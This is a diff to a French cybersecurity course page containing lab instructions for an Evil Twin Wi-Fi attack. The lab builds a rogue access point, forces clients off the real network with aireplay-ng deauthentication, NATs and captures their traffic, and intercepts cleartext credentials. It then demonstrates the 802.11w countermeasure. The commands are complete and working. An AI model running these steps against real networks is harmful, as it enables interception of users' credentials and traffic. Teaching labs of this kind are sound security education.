+sudo ip addr add 192.168.99.1/24 dev br-evil
+
+# Retirer l'IP de wlan2 si elle y est déjà
+sudo ip addr del 192.168.99.1/24 dev wlan2 2>/dev/null || true</pre>
+                                        <div class="step-output"><span class="step-output-label">Vérification</span>$ ip addr show br-evil | grep inet
+    inet 192.168.99.1/24 brd 192.168.99.255 scope global br-evil</div>
+                                        <div class="step-info"><i class="fas fa-info-circle me-1"></i> Le fichier <code>hostapd-evil-twin.conf</code> contient déjà <code>bridge=br-evil</code> — hostapd ajoutera automatiquement wlan2 au bridge au démarrage.</div>
+                                    </div>
+                                </li>
+
+                                <li class="step-item">
+                                    <div class="step-num">B2</div>
+                                    <div class="step-body">
+                                        <h6>Terminal 3 — Démarrer le Rogue AP et le serveur DHCP</h6>
+                                        <p><code>hostapd-evil-twin.conf</code> diffuse le même SSID que l'AP légitime mais sans chiffrement. <code>dnsmasq</code> distribue des IPs aux clients qui s'y connecteront.</p>
+                                        <pre># Démarrer le Rogue AP (même SSID, réseau ouvert)
 sudo hostapd /opt/swfe837/configs/hostapd-evil-twin.conf &amp;
-sudo dnsmasq -C /opt/swfe837/configs/dnsmasq-evil-twin.conf
+
+# Démarrer le serveur DHCP
+sudo dnsmasq -C /opt/swfe837/configs/dnsmasq-evil-twin.conf --no-daemon &amp;</pre>
+                                        <div class="step-output"><span class="step-output-label">Sortie attendue hostapd</span>wlan2: interface state UNINITIALIZED->ENABLED
+wlan2: AP-ENABLED</div>
+                                        <div class="step-info"><i class="fas fa-info-circle me-1"></i> Le Rogue AP diffuse <code>NexelliaWifi</code> sans mot de passe. Le client associé obtient une IP dans 192.168.99.0/24 et tout son trafic transite en clair par wlan2.</div>
+                                    </div>
+                                </li>
+
+                                <li class="step-item">
+                                    <div class="step-num">B3</div>
+                                    <div class="step-body">
+                                        <h6>Terminal 3 — Activer le NAT pour que le client ait accès au réseau</h6>
+                                        <p>Sans NAT, le client n'aurait pas d'accès réseau et se méfierait. Le NAT donne l'illusion d'un accès normal tout en faisant transiter tout le trafic par notre machine.</p>
+                                        <pre># Activer le forwarding IP (si pas déjà fait par install_labo.sh)
+echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+
+# Règle NAT : tout ce qui sort de wlan2 est masqué derrière eth0
 sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
-sudo aireplay-ng -0 10 -a [BSSID_legitime] wlan0mon
-sudo tcpdump -i wlan2 -w capture.pcap</pre>
+sudo iptables -A FORWARD -i wlan2 -o eth0 -j ACCEPT
+sudo iptables -A FORWARD -i eth0 -o wlan2 -m state --state RELATED,ESTABLISHED -j ACCEPT</pre>
+                                        <div class="step-info"><i class="fas fa-info-circle me-1"></i> Remplacez <code>eth0</code> par le nom de votre interface réseau principale si différent : <code>ip route | grep default</code> vous donnera le nom correct.</div>
+                                    </div>
+                                </li>
+
+                                <li class="step-item">
+                                    <div class="step-num">B4</div>
+                                    <div class="step-body">
+                                        <h6>Terminal 4 — Lancer la capture tcpdump sur le Rogue AP</h6>
+                                        <p>On capture tout le trafic qui transite par wlan2 — l'interface du Rogue AP. La capture doit être lancée <strong>avant</strong> la désauthentification pour ne rien rater.</p>
+                                        <pre>sudo tcpdump -i wlan2 -w /tmp/evil_twin_capture.pcap -v</pre>
+                                        <div class="step-output"><span class="step-output-label">Sortie attendue</span>tcpdump: listening on wlan2, link-type EN10MB (Ethernet), snapshot length 262144 bytes</div>
+                                        <div class="step-warn"><i class="fas fa-exclamation-triangle me-1"></i> <strong>Laissez ce terminal ouvert.</strong> La capture s'arrêtera avec <kbd>Ctrl+C</kbd> une fois la démonstration terminée.</div>
+                                    </div>
+                                </li>
+
+                            </ul>
+
+                            <div class="checkpoint-box">
+                                <h6><i class="fas fa-check-circle me-2"></i>Validation Partie B</h6>
+                                <ul>
+                                    <li>wlan2 a l'IP 192.168.99.1 : <code>ip addr show wlan2</code></li>
+                                    <li>Rogue AP actif : <code>sudo iwlist wlan1 scan | grep NexelliaWifi</code> liste deux APs</li>
+                                    <li>tcpdump écoute sur wlan2</li>
+                                </ul>
+                            </div>
+
+                            <!-- ── PARTIE C ── -->
+                            <div class="section-sub">Partie C — Désauthentification et connexion au Rogue AP</div>
+
+                            <ul class="step-list">
+
+                                <li class="step-item">
+                                    <div class="step-num">C1</div>
+                                    <div class="step-body">
+                                        <h6>Terminal 3 — Passer wlan2 en mode monitor pour la désauth</h6>
+                                        <p>On stoppe temporairement le Rogue AP pour passer wlan2 en mode monitor, envoyer les trames de désauth, puis le relancer. <strong>Alternative :</strong> si vous avez une quatrième interface (wlan3), utilisez-la directement pour la désauth sans toucher à wlan2.</p>
+                                        <pre># Arrêter le Rogue AP temporairement
+sudo pkill hostapd
+
+# Passer wlan2 en mode monitor
+sudo airmon-ng check kill
+sudo airmon-ng start wlan2</pre>
+                                        <div class="step-output"><span class="step-output-label">Sortie attendue</span>wlan2: interface state ENABLED->DISABLED
+(mac80211 monitor mode vif enabled on phy2 → wlan2mon)</div>
+                                    </div>
+                                </li>
+
+                                <li class="step-item">
+                                    <div class="step-num">C2</div>
+                                    <div class="step-body">
+                                        <h6>Terminal 3 — Envoyer les trames de désauthentification</h6>
+                                        <p>Remplacez <code>[BSSID_AP]</code> et <code>[MAC_CLIENT]</code> par les valeurs notées à l'étape A3.</p>
+                                        <pre>sudo aireplay-ng -0 10 -a [BSSID_AP] -c [MAC_CLIENT] wlan2mon</pre>
+                                        <div class="step-output"><span class="step-output-label">Sortie attendue</span>Waiting for beacon frame (BSSID: 02:00:00:00:00:00) on channel 6
+Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:01:00]
+Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:01:00]
+...</div>
+                                        <p>Dans le <strong>Terminal 2</strong> (wpa_supplicant), vous devez voir :</p>
+                                        <div class="step-output"><span class="step-output-label">Terminal 2 — client déconnecté</span>wlan1: CTRL-EVENT-DISCONNECTED bssid=02:00:00:00:00:00 reason=7
+wlan1: SME: Trying to authenticate...</div>
+                                    </div>
+                                </li>
+
+                                <li class="step-item">
+                                    <div class="step-num">C3</div>
+                                    <div class="step-body">
+                                        <h6>Terminal 3 — Relancer le Rogue AP immédiatement après</h6>
+                                        <p>Le client cherche à se reconnecter — le Rogue AP doit être présent. On sort du mode monitor et on relance hostapd.</p>
+                                        <pre># Stopper le mode monitor
+sudo airmon-ng stop wlan2mon
+
+# Remettre l'IP sur wlan2
+sudo ip link set wlan2 up
+sudo ip addr add 192.168.99.1/24 dev wlan2 2>/dev/null || true
+
+# Relancer le Rogue AP
+sudo hostapd /opt/swfe837/configs/hostapd-evil-twin.conf &amp;</pre>
+                                        <div class="step-info"><i class="fas fa-info-circle me-1"></i> <strong>Timing critique :</strong> le client tente de se reconnecter immédiatement après la désauth. Plus le Rogue AP est relancé vite, plus la probabilité qu'il soit choisi est élevée. En pratique, dans un vrai scénario, le Rogue AP tourne en continu sur une interface dédiée.</div>
+                                    </div>
+                                </li>
+
+                                <li class="step-item">
+                                    <div class="step-num">C4</div>
+                                    <div class="step-body">
+                                        <h6>Terminal 3 — Vérifier que le client est connecté au Rogue AP</h6>
+                                        <pre>iw dev wlan1 link
+ip addr show wlan1</pre>
+                                        <div class="step-output"><span class="step-output-label">Sortie attendue si le client a rejoint le Rogue AP</span>Connected to 02:00:00:00:02:00 (on wlan1)   ← BSSID du Rogue AP (wlan2)
+        SSID: NexelliaWifi
+        freq: 2437
+
+inet 192.168.99.XX/24   ← IP dans le sous-réseau du Rogue AP</div>
+                                        <div class="step-warn"><i class="fas fa-exclamation-triangle me-1"></i> Si wlan1 est resté sur l'AP légitime (BSSID 02:00:00:00:00:00), relancez la désauth (C2) et réessayez. Avec mac80211_hwsim, le client choisit parfois l'AP avec le meilleur signal simulé.</div>
+                                    </div>
+                                </li>
+
+                            </ul>
+
+                            <!-- ── PARTIE D ── -->
+                            <div class="section-sub">Partie D — Analyser le trafic intercepté</div>
+
+                            <ul class="step-list">
+
+                                <li class="step-item">
+                                    <div class="step-num">D1</div>
+                                    <div class="step-body">
+                                        <h6>Terminal 5 — Vérifier la connectivité client → Rogue AP</h6>
+                                        <p>Vérifiez d'abord que wlan1 a une IP dans le sous-réseau du Rogue AP, puis générez du trafic avec <code>ping</code> — plus fiable que HTTP dans un setup tout-en-un.</p>
+                                        <pre># Vérifier l'IP de wlan1 (doit être dans 192.168.99.x)
+ip addr show wlan1 | grep "inet "
+# Si absent : sudo ip addr add 192.168.99.10/24 dev wlan1
+
+# Tester la connectivité via le bridge
+ping -I wlan1 192.168.99.1 -c 5</pre>
+                                        <div class="step-output"><span class="step-output-label">Sortie attendue avec bridge actif</span>PING 192.168.99.1 from 192.168.99.10 wlan1:
+64 bytes from 192.168.99.1: icmp_seq=1 ttl=64 time=X ms
+5 packets transmitted, 5 received, 0% packet loss</div>
+                                        <div class="step-warn"><i class="fas fa-exclamation-triangle me-1"></i> Si vous obtenez <code>Destination Host Unreachable</code>, le bridge n'est pas actif. Recommencez depuis B1 en vous assurant que hostapd a bien démarré avec <code>bridge=br-evil</code> dans sa config.</div>
+                                    </div>
+                                </li>
+
+                                <li class="step-item">
+                                    <div class="step-num">D1b</div>
+                                    <div class="step-body">
+                                        <h6>Terminal 5 — Envoyer des données en clair avec netcat (UDP)</h6>
+                                        <p>Pour simuler une interception d'identifiants, on utilise netcat en UDP — pas de handshake TCP, fonctionne dans tous les cas.</p>
+                                        <pre># Terminal 3 — écouter en UDP sur le Rogue AP
+sudo nc -ulvp 5000
+
+# Terminal 5 — envoyer des "identifiants" depuis wlan1
+echo "user=alice&password=secret123" | nc -u -s 192.168.99.10 192.168.99.1 5000</pre>
+                                        <div class="step-output"><span class="step-output-label">Terminal 3 (netcat) — données reçues en clair</span>user=alice&amp;password=secret123</div>
+                                        <div class="step-output"><span class="step-output-label">tcpdump -r /tmp/evil_twin_capture.pcap -n -A — paquet UDP visible</span>192.168.99.10.XXXXX &gt; 192.168.99.1.5000: UDP
+...user=alice&amp;password=secret123</div>
+                                        <div class="step-info"><i class="fas fa-info-circle me-1"></i> <strong>Point clé :</strong> les données transitent en clair sur wlan2 (réseau ouvert). Dans un vrai scénario, n'importe quel traffic non-TLS — identifiants de portail captif, cookies HTTP, requêtes DNS — serait interceptable de cette façon.</div>
+                                    </div>
+                                </li>
+
+                                <li class="step-item">
+                                    <div class="step-num">D2</div>
+                                    <div class="step-body">
+                                        <h6>Arrêter la capture et analyser avec Wireshark</h6>
+                                        <pre># Terminal 4 : arrêter tcpdump
+Ctrl+C
+
+# Analyser la capture dans Wireshark
+wireshark /tmp/evil_twin_capture.pcap &amp;
+
+# Ou en ligne de commande : afficher les requêtes HTTP
+tcpdump -r /tmp/evil_twin_capture.pcap -A 'tcp port 80' | grep -E "GET|Host:|User-Agent:"</pre>
+                                        <div class="step-output"><span class="step-output-label">Sortie attendue (trafic HTTP en clair)</span>GET / HTTP/1.1
+Host: neverssl.com
+User-Agent: curl/7.88.1
+Accept: */*</div>
+                                        <p>Dans Wireshark, appliquez le filtre <code>http</code> pour isoler les requêtes. Un clic droit → <em>Follow → HTTP Stream</em> affiche l'échange complet en clair.</p>
+                                        <div class="step-info"><i class="fas fa-info-circle me-1"></i> <strong>Point clé :</strong> sur un vrai réseau d'entreprise, ce trafic contiendrait les identifiants du portail captif, les cookies de session, les requêtes DNS — tout ce qu'un attaquant peut exploiter sans jamais déchiffrer quoi que ce soit.</div>
+                                    </div>
+                                </li>
+
+                            </ul>
+
+                            <div class="checkpoint-box">
+                                <h6><i class="fas fa-check-circle me-2"></i>Validation Parties C et D</h6>
+                                <ul>
+                                    <li>wlan1 connecté au Rogue AP (BSSID wlan2, IP 192.168.99.x)</li>
+                                    <li>tcpdump a capturé du trafic : <code>ls -lh /tmp/evil_twin_capture.pcap</code></li>
+                                    <li>Wireshark affiche des requêtes HTTP en clair filtrées par <code>http</code></li>
+                                </ul>
+                            </div>
+
+                            <!-- ── PARTIE E ── -->
+                            <div class="section-sub">Partie E — Contre-mesure 802.11w (PMF)</div>
+                            <div class="theory-box">
+                                <h6><i class="fas fa-shield-halved me-2"></i>Qu'est-ce que 802.11w change ?</h6>
+                                <p>Avec PMF activé (<code>ieee80211w=2</code> dans hostapd), les trames de désauthentification sont protégées par un MIC (Message Integrity Code) dérivé de la clé de session. Un attaquant qui forge une trame de désauth sans connaître cette clé voit sa trame <strong>ignorée silencieusement</strong> par le client.</p>
+                            </div>
+
+                            <ul class="step-list">
+
+                                <li class="step-item">
+                                    <div class="step-num">E1</div>
+                                    <div class="step-body">
+                                        <h6>Terminal 3 — Créer une config AP avec 802.11w activé</h6>
+                                        <pre>cp /opt/swfe837/configs/hostapd-wpa2-tp1.conf /tmp/hostapd-pmf.conf
+# Activer PMF obligatoire (2 = required)
+echo "ieee80211w=2" | sudo tee -a /tmp/hostapd-pmf.conf
+grep ieee80211w /tmp/hostapd-pmf.conf</pre>
+                                        <div class="step-output"><span class="step-output-label">Sortie attendue</span>ieee80211w=2</div>
+                                    </div>
+                                </li>
+
+                                <li class="step-item">
+                                    <div class="step-num">E2</div>
+                                    <div class="step-body">
+                                        <h6>Terminal 1 — Relancer l'AP avec PMF activé</h6>
+                                        <pre># Couper le vieil AP
+sudo pkill hostapd
+
+# Relancer avec PMF
+sudo hostapd /tmp/hostapd-pmf.conf</pre>
+                                        <div class="step-output"><span class="step-output-label">Sortie attendue</span>wlan0: interface state UNINITIALIZED->ENABLED
+wlan0: AP-ENABLED</div>
+                                        <p>Reconnectez le client (Terminal 2) :</p>
+                                        <pre>sudo pkill wpa_supplicant 2>/dev/null; sleep 1; sudo rm -rf /run/wpa_supplicant/wlan1
+sudo wpa_supplicant -i wlan1 -c /opt/swfe837/configs/wpa_supplicant-wpa2-tp1.conf</pre>
+                                    </div>
+                                </li>
+
+                                <li class="step-item">
+                                    <div class="step-num">E3</div>
+                                    <div class="step-body">
+                                        <h6>Terminal 3 — Relancer l'attaque de désauth</h6>
+                                        <p>Même commande qu'en C2. Observez le Terminal 2 (wpa_supplicant) : avec 802.11w activé, le client <strong>ignore les trames forgées</strong> et reste connecté.</p>
+                                        <pre>sudo airmon-ng start wlan2
+sudo aireplay-ng -0 10 -a [BSSID_AP] -c [MAC_CLIENT] wlan2mon</pre>
+                                        <div class="step-output"><span class="step-output-label">Terminal 2 — avec 802.11w : le client reste connecté</span>wlan1: CTRL-EVENT-CONNECTED   ← toujours connecté, pas de DISCONNECTED</div>
+                                        <div class="step-output"><span class="step-output-label">Terminal 2 — sans 802.11w (référence TP C2)</span>wlan1: CTRL-EVENT-DISCONNECTED bssid=02:00:00:00:00:00 reason=7</div>
+                                        <div class="step-info"><i class="fas fa-info-circle me-1"></i> <strong>Conclusion :</strong> avec <code>ieee80211w=2</code>, la désauthentification forgée est rejetée. Sans le client connecté à l'AP légitime, le Rogue AP ne peut pas être injecté — l'attaque Evil Twin est neutralisée à sa source.</div>
+                                    </div>
+                                </li>
+
+                            </ul>
+
+                            <div class="checkpoint-box">
+                                <h6><i class="fas fa-check-circle me-2"></i>Critères de validation complets</h6>
+                                <ul>
+                                    <li>Partie A : client connecté à l'AP légitime (<code>CTRL-EVENT-CONNECTED</code>)</li>
+                                    <li>Partie B : Rogue AP actif, tcpdump en écoute</li>
+                                    <li>Partie C : client migré vers le Rogue AP (IP 192.168.99.x)</li>
+                                    <li>Partie D : trafic HTTP visible en clair dans Wireshark</li>
+                                    <li>Partie E : désauth ignorée avec <code>ieee80211w=2</code> — client reste connecté</li>
+                                    <li>Captures d'écran de chaque étape clé prises pour le portfolio</li>
+                                </ul>
+                            </div>
+
+                            <!-- ── Dépannage ── -->
+                            <div class="troubleshoot-box">
+                                <h6><i class="fas fa-wrench me-2"></i>Dépannage</h6>
+                                <div class="tr-item">
+                                    <div class="tr-prob">⚠ Le client reste sur l'AP légitime après la désauth</div>
+                                    <div class="tr-sol">Avec mac80211_hwsim, les deux APs ont le même signal simulé et le client peut rechoisir l'AP légitime. Répétez la désauth plusieurs fois (C2), ou augmentez le nombre de trames : <code>-0 30</code>. Assurez-vous que le Rogue AP est relancé (C3) avant de re-tenter.</div>
+                                </div>
+                                <div class="tr-item">
+                                    <div class="tr-prob">⚠ dnsmasq échoue : "address already in use"</div>
+                                    <div class="tr-sol">Un processus dnsmasq tourne déjà : <code>sudo pkill dnsmasq</code> puis relancez. Vérifiez aussi que l'IP 192.168.99.1 est bien assignée à wlan2 avant de lancer dnsmasq.</div>
+                                </div>
+                                <div class="tr-item">
+                                    <div class="tr-prob">⚠ tcpdump ne capture rien sur wlan2</div>
+                                    <div class="tr-sol">Le client n'est pas encore connecté au Rogue AP ou n'a pas de trafic. Vérifiez l'IP de wlan1 (<code>ip addr show wlan1</code>) — elle doit être dans 192.168.99.0/24. Si non, le client est sur l'AP légitime — recommencez depuis C1.</div>
+                                </div>
+                                <div class="tr-item">
+                                    <div class="tr-prob">⚠ curl : "Couldn't connect to server"</div>
+                                    <div class="tr-sol">Le NAT n'est pas actif ou la règle iptables est absente. Vérifiez : <code>sudo iptables -t nat -L POSTROUTING</code>. Si vide, relancez les commandes de B3. Vérifiez aussi que le forwarding IP est actif : <code>cat /proc/sys/net/ipv4/ip_forward</code> doit retourner <code>1</code>.</div>
+                                </div>
+                                <div class="tr-item">
+                                    <div class="tr-prob">⚠ E3 : le client se déconnecte quand même avec ieee80211w=2</div>
+                                    <div class="tr-sol">wpa_supplicant-wpa2-tp1.conf ne déclare pas PMF côté client. Ajoutez <code>ieee80211w=2</code> dans le bloc <code>network{}</code> du fichier wpa_supplicant pour que le 4-way handshake négocie bien la protection PMF des deux côtés.</div>
+                                </div>
+                            </div>
+
+                            <!-- ── Questions ── -->
                             <div class="analysis-box">
                                 <h6><i class="fas fa-question-circle"></i> Questions d'analyse</h6>
                                 <ol>
-                                    <li>Pourquoi un client se connecte-t-il automatiquement à un Evil Twin ?</li>
-                                    <li>Le filtrage MAC est-il une protection suffisante ? Justifiez.</li>
-                                    <li>Qu'apporte le 802.11w (PMF) dans ce scénario ?</li>
-                                    <li>Comment sensibiliser les 200 collaborateurs de Nexellia à cette menace ? Proposez 3 actions concrètes.</li>
+                                    <li>Pourquoi un client WPA2-PSK se connecte-t-il automatiquement au Rogue AP alors qu'il ne connaît pas son mot de passe ?</li>
+                                    <li>Le filtrage par adresse MAC côté AP légitime aurait-il empêché cette attaque ? Justifiez.</li>
+                                    <li>Comparez le comportement observé en C2 (sans 802.11w) et en E3 (avec 802.11w). Qu'est-ce que 802.11w protège exactement ?</li>
+                                    <li>Comment sensibiliser les 200 collaborateurs de Nexellia à cette menace ? Proposez 3 actions concrètes (technique, procédurale, humaine).</li>
                                 </ol>
                             </div>
+
+                            <!-- ── Livrables ── -->
                             <div class="deliverable-box">
                                 <h6><i class="fas fa-box-archive me-1"></i> Livrables pour le portfolio</h6>
                                 <ul>
-                                    <li>Capture Wireshark montrant des identifiants HTTP interceptés</li>
-                                    <li>Capture de la contre-mesure 802.11w (désauth bloquée)</li>
-                                    <li>Document de recommandations : politique Wi-Fi Nexellia</li>
+                                    <li>Capture Wireshark filtrée <code>http</code> montrant une requête GET et ses entêtes en clair</li>
+                                    <li>Capture Terminal 2 : <code>CTRL-EVENT-DISCONNECTED</code> (C2) vs connexion maintenue (E3)</li>
+                                    <li>Analyse écrite ≥ 300 mots : reconstitution de l'attaque Nexellia, impact réel, recommandations de remédiation prioritaires</li>
                                 </ul>
                             </div>
+
+                        </div>
                         </div>
                     </div>
                 </div>
@@ -1278,7 +1607,7 @@ sudo tcpdump -i wlan2 -w capture.pcap</pre>
                 <div class="accordion-item">
                     <h2 class="accordion-header" id="heading4">
                         <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse4" aria-expanded="false" aria-controls="collapse4">
-                            <i class="fas fa-radar me-2"></i> TP4 – Surveillance &amp; détection d'intrusion Wi‑Fi (2h)
+                            <i class="fas fa-radar me-2"></i> TP4 – Surveillance &amp; détection d'intrusion Wi‑Fi (10mn)
                         </button>
                     </h2>
                     <div id="collapse4" class="accordion-collapse collapse" aria-labelledby="heading4" data-bs-parent="#mainAccordion">
@@ -1287,6 +1616,18 @@ sudo tcpdump -i wlan2 -w capture.pcap</pre>
                             <div class="mission-card">
                                 <div class="mission-label"><i class="fas fa-eye me-1"></i> Mission 4 · Ne plus jamais rater une attaque</div>
                                 <p>L'attaque contre Nexellia a duré <strong>3 semaines avant d'être détectée</strong>, uniquement grâce à un audit externe. Votre mission : déployer un IDS Wi-Fi qui détecte en temps réel les attaques des TP1 et TP3, et génère des alertes exploitables par l'équipe interne.</p>
+                            </div>
+
+                            <div class="prereq-box">
+                                <h6><i class="fas fa-list-check me-2"></i>Prérequis</h6>
+                                <ul>
+                                    <li>TP3 terminé — snapshot <em>"Après_TP3"</em> créé, <code>sudo bash scripts/reset_labo.sh</code> exécuté</li>
+                                    <li>4 interfaces disponibles : <code>iw dev</code> liste wlan0, wlan1, wlan2, wlan3</li>
+                                    <li>Script IDS présent : <code>ls scripts/ids_wifi.py</code></li>
+                                    <li>Scapy fonctionnel : <code>python3 -c "from scapy.all import Dot11Deauth, Dot11Disas; print('OK')"</code></li>
+                                    <li>Si erreur scapy : <code>sudo apt install python3-scapy python3-colorama</code></li>
+                                    <li>wlan3 disponible pour le mode monitor (non utilisé par le Rogue AP)</li>
+                                </ul>
                             </div>
 
                             <h5>Objectifs</h5>
@@ -1410,7 +1751,6 @@ sniff(iface="wlan3mon", prn=detect_deauth)</pre>
                     </div>
                 </div>
 
-            </div><!-- fin accordion -->
 
             <div class="footer-note">
                 <p><i class="fas fa-graduation-cap"></i> Module SWFE837 – Mastère SIN Expert Cybersécurité – 2025-2026 · Tous les TP sont réalisés dans un environnement isolé à des fins pédagogiques exclusivement.</p>
